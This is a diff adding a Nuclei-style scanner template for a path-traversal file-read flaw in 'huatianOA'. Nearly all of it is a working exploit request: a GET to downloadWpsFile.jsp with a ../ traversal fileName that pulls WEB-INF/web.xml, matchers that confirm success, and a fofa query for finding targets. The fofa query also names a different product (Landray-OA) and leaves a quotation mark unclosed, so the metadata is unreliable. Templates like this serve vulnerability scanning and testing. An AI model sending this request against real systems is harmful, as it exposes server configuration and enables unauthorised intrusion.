@@ -1,0 +1,34 @@
+id: huatianOA_downloadWpsFile_File_reading
+
+info:
+  tags: huatianOA_downloadWpsFile_File_reading
+  name: huatianOA_downloadWpsFile_File_reading
+  author: xc
+  severity: critical
+  description: |
+    huatianOA_downloadWpsFile_File_reading.
+  metadata:
+    verified: true
+    fofa-query: app="Landray-OA系统
+
+
+http:
+  - raw:
+      - |
+        GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
